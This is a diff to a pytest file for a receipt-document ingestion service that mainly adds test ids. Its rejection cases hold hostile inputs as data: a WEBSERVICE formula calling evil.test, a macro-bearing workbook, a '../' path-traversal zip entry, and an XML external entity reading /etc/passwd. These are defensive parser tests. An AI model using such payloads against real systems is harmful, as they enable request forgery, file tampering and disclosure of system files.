@@ -61,7 +61,7 @@ def test_every_accepted_source_type_has_a_download_suffix():
     [
         (b"Compra en efectivo DOP 150", "text/plain", "DOP 150"),
         (b"date,amount,currency\n2026-10-09,150,DOP\n", "text/csv", "150"),
-        (workbook(), XLSX, "Receipt"),
+        pytest.param(workbook(), XLSX, "Receipt", id="workbook"),
         (ECF.read_bytes(), "text/xml", "E320000001234"),
         (
             b"<recibo><total>150</total><moneda>DOP</moneda></recibo>",
@@ -93,17 +93,21 @@ def test_csv_rows_stay_separate_evidence_rows():
     [
         (b"\x00binary", "text/plain", "invalid_document"),
         (b"a,b\n" + b"1,2\n" * 301, "text/csv", "document_row_limit"),
-        (
+        pytest.param(
             workbook('<row><c><f>WEBSERVICE("https://evil.test")</f><v>1</v></c></row>'),
             XLSX,
             "spreadsheet_formula_unsupported",
+            id="formula",
         ),
-        (
+        pytest.param(
             workbook(extra={"xl/vbaProject.bin": b"code"}),
             XLSX,
             "unsupported_spreadsheet_content",
+            id="macro",
         ),
-        (workbook(extra={"../escape.xml": b"<x/>"}), XLSX, "invalid_document"),
+        pytest.param(
+            workbook(extra={"../escape.xml": b"<x/>"}), XLSX, "invalid_document", id="path"
+        ),
         (b"not a spreadsheet", XLSX, "invalid_document"),
         (
             b'<!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]><r>&e;</r>',
